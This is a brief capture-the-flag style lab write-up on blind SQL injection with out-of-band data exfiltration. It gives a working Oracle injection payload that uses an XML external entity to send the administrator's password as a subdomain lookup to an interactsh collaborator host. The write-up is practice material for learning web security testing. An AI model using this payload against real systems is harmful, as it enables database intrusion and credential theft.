### Lab: Blind SQL injection with out-of-band data exfiltration
## 1.Vulnerability:

*Like previous lab, traditional attack did not provide any signal. We have to trigger an OAST(Since I don't have the pro version)*

*In this lab, we must query password to login*

## 2.Exploitation:

**Payload:**
```
sql

' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://' || (SELECT password FROM users WHERE username='administrator') || '.rlfxrwayrflozmmxjllu6tcf4pc0cgz60.oast.fun"> %remote;]>'),'/l') FROM dual--

```
**With this lab I use https://app.interactsh.com/**


*We add payload then CTR+U(like previous lab)*

**Ensuring burp return 200 OK -> Done**




